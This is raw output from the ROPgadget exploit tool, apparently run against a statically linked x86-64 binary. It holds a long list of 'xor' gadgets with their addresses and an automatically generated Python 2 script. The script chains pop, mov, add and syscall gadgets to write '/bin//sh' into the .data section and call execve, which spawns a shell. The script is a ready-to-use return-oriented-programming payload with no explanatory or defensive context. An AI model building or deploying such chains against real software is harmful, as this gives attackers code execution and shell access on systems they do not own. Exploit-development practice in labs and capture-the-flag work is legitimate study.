0x0000000000432daf : xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000403797 : xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; and byte ptr [r14 + 0xf], 0xfe ; ret
0x0000000000479f6c : xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x0000000000431dae : xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x000000000049b4f4 : xor byte ptr [rsi - 0x607f0007], bl ; stc ; call rax
0x000000000049b19d : xor cl, bh ; jmp qword ptr [rax]
0x0000000000418cbd : xor cl, byte ptr [rax - 0x77] ; ret 0x2948
0x00000000004848c3 : xor cl, byte ptr [rax - 0x7d] ; ret 0x4810
0x00000000004620d7 : xor cl, byte ptr [rax - 0x7d] ; ret 0x4901
0x0000000000493d5e : xor cl, byte ptr [rax] ; jne 0x493d83 ; mov rax, qword ptr [rax] ; ret
0x000000000040c5a0 : xor cl, ch ; ret
0x000000000049b630 : xor cl, dl ; stc ; push rax ; sar cl, cl ; call rax
0x00000000004b8bf0 : xor dh, ah ; std ; jmp qword ptr [rdi]
0x000000000049c980 : xor dh, byte ptr [rsi] ; sti ; jmp rdx
0x0000000000460f29 : xor dh, dh ; ret 0x4002
0x000000000049bce5 : xor dl, bh ; jmp qword ptr [rdx]
0x000000000049bc29 : xor dl, bh ; jmp rax
0x000000000042a26a : xor dl, byte ptr [rbx] ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x0000000000486c7e : xor dl, dh ; jmp r11
0x0000000000486d90 : xor dl, dh ; ret
0x000000000049b590 : xor dl, dl ; stc ; push rax ; sar ecx, cl ; call rax
0x0000000000401611 : xor dword ptr [rax - 0x3f], ecx ; loop 0x40163f ; or rax, rdx ; ret
0x000000000046ca5d : xor dword ptr [rax - 0x77], ecx ; ror dword ptr [rax - 0x77], 1 ; ret 0xe7e9
0x0000000000452d9f : xor dword ptr [rax - 0x7d], ecx ; ret 0xf01
0x0000000000493dcd : xor dword ptr [rax], ecx ; jne 0x493ddc ; mov qword ptr [rax], rdx ; ret
0x0000000000422969 : xor dword ptr [rbx - 0x76b7f020], eax ; ret 0x8948
0x000000000040b30b : xor dword ptr [rcx - 1], edx ; dec dword ptr [rcx - 0x77] ; ret 0x149
0x000000000042a2f2 : xor dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000042afb1 : xor dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x00000000004723de : xor eax, 0x24ca3d ; jmp rax
0x000000000049c945 : xor eax, 0x3591fffb ; sti ; jmp rdx
0x000000000049c969 : xor eax, 0x35a4fffb ; sti ; jmp rdx
0x000000000049c96d : xor eax, 0x35e2fffb ; sti ; jmp rdx
0x000000000049c97d : xor eax, 0x3632fffb ; sti ; jmp rdx
0x000000000049b1a9 : xor eax, 0x36a0fff9 ; stc ; jmp qword ptr [rax]
0x000000000044e1c3 : xor eax, 0x48000002 ; mov ecx, edx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000045120a : xor eax, 0x7d8b48 ; call r12
0x000000000046c36a : xor eax, 0x89ffffe6 ; ret
0x00000000004152f6 : xor eax, dword ptr [0x30] ; call rax
0x000000000041c230 : xor eax, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000041d014 : xor eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000463619 : xor eax, eax ; add rsp, 8 ; ret
0x000000000042a102 : xor eax, eax ; call 0x416324
0x000000000047e268 : xor eax, eax ; call 0x485018
0x000000000047c54b : xor eax, eax ; cmp rdi, rdx ; ja 0x47c580 ; ret
0x0000000000452827 : xor eax, eax ; cmp rdx, rdi ; setae al ; ret
0x000000000041b1c0 : xor eax, eax ; jmp 0x41b18a
0x0000000000463cfc : xor eax, eax ; jmp 0x463cc4
0x0000000000463cfb : xor eax, eax ; jmp 0x463cc5
0x000000000047c938 : xor eax, eax ; leave ; ret
0x0000000000479d52 : xor eax, eax ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000040c73f : xor eax, eax ; pop rbp ; pop r12 ; ret
0x000000000041b26b : xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000415605 : xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000042a33c : xor eax, eax ; pop rbx ; pop rbp ; ret
0x00000000004198e2 : xor eax, eax ; pop rbx ; ret
0x0000000000401db0 : xor eax, eax ; ret
0x000000000042c9be : xor eax, eax ; sub eax, ecx ; ret
0x000000000041b290 : xor eax, eax ; test rdx, rdx ; jne 0x41b2a8 ; ret
0x000000000043229c : xor eax, eax ; vzeroupper ; ret
0x000000000045f888 : xor ebp, ecx ; ret 0xfffd
0x0000000000401894 : xor ebx, dword ptr [rsi + 8] ; or r10, r11 ; cmovne rax, rdx ; ret
0x0000000000480dd0 : xor ebx, ebx ; jmp 0x480d99
0x000000000040191e : xor ebx, ebx ; lea rax, qword ptr [rsp + 8] ; ret
0x000000000045f586 : xor ebx, ebx ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000045e559 : xor ecx, ecx ; call r15
0x000000000047ab49 : xor ecx, ecx ; xor edx, edx ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x0000000000452d7c : xor edi, dword ptr [rax] ; ret 0x2f75
0x000000000047cf69 : xor edi, ebp ; dec dword ptr [rax + 0x39] ; ret
0x000000000049b1a5 : xor edi, ecx ; jmp qword ptr [rax]
0x000000000040a91b : xor edi, edi ; call 0x426b84
0x0000000000421631 : xor edi, edi ; pop rbx ; mov rax, rdi ; pop rbp ; pop r12 ; ret
0x0000000000401e0f : xor edx, 0x20 ; test eax, eax ; mov eax, ebx ; cmovne eax, edx ; pop rbx ; ret
0x0000000000415230 : xor edx, dword ptr [0x30] ; call rdx
0x000000000049bce1 : xor edx, edi ; call qword ptr [rdx + 0x22fffa30]
0x000000000049bc5d : xor edx, edi ; call qword ptr [rsi]
0x000000000049be1d : xor edx, edi ; call rax
0x000000000049be19 : xor edx, edi ; inc dword ptr [rax + 0x31] ; cli ; call rax
0x000000000049bd9d : xor edx, edi ; jmp rsp
0x0000000000455433 : xor edx, edx ; add eax, 1 ; push rax ; call rbx
0x0000000000453ffc : xor edx, edx ; cmp ebx, eax ; setne dl ; jmp 0x453fec
0x0000000000476a53 : xor edx, edx ; div r13 ; mov rbp, rax ; jmp 0x476a28
0x000000000041dbe3 : xor edx, edx ; jmp rax
0x000000000047ab4b : xor edx, edx ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x0000000000425eec : xor edx, edx ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x0000000000401a44 : xor edx, edx ; ret
0x000000000047f666 : xor esi, esi ; call 0x400499
0x000000000046811c : xor esi, esi ; jmp rax
0x0000000000463093 : xor esp, edx ; stc ; dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x0000000000401a43 : xor r10, r10 ; ret
0x000000000040191d : xor r11, r11 ; lea rax, qword ptr [rsp + 8] ; ret
0x000000000045e558 : xor r9d, r9d ; call r15
0x00000000004152f5 : xor rax, qword ptr [0x30] ; call rax
0x00000000004152f4 : xor rax, qword ptr fs:[0x30] ; call rax
0x000000000044b620 : xor rax, rax ; ret
0x000000000041522f : xor rdx, qword ptr [0x30] ; call rdx
0x000000000041522e : xor rdx, qword ptr fs:[0x30] ; call rdx

Unique gadgets found: 9257

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x485ff1 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x4010dc pop rsi ; ret
	[+] Gadget found: 0x41c0c4 pop rax ; ret
	[+] Gadget found: 0x44b620 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x44b620 xor rax, rax ; ret
	[+] Gadget found: 0x47b480 add rax, 1 ; ret
	[+] Gadget found: 0x47b481 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x4006c6 pop rdi ; ret
	[+] Gadget found: 0x4010dc pop rsi ; ret
	[+] Gadget found: 0x4502e5 pop rdx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x47ba25 syscall ; ret

- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<Q', 0x00000000004010dc) # pop rsi ; ret
	p += pack('<Q', 0x00000000006c10e0) # @ .data
	p += pack('<Q', 0x000000000041c0c4) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x0000000000485ff1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x00000000004010dc) # pop rsi ; ret
	p += pack('<Q', 0x00000000006c10e8) # @ .data + 8
	p += pack('<Q', 0x000000000044b620) # xor rax, rax ; ret
	p += pack('<Q', 0x0000000000485ff1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x00000000004006c6) # pop rdi ; ret
	p += pack('<Q', 0x00000000006c10e0) # @ .data
	p += pack('<Q', 0x00000000004010dc) # pop rsi ; ret
	p += pack('<Q', 0x00000000006c10e8) # @ .data + 8
	p += pack('<Q', 0x00000000004502e5) # pop rdx ; ret
	p += pack('<Q', 0x00000000006c10e8) # @ .data + 8
	p += pack('<Q', 0x000000000044b620) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000047ba25) # syscall ; ret
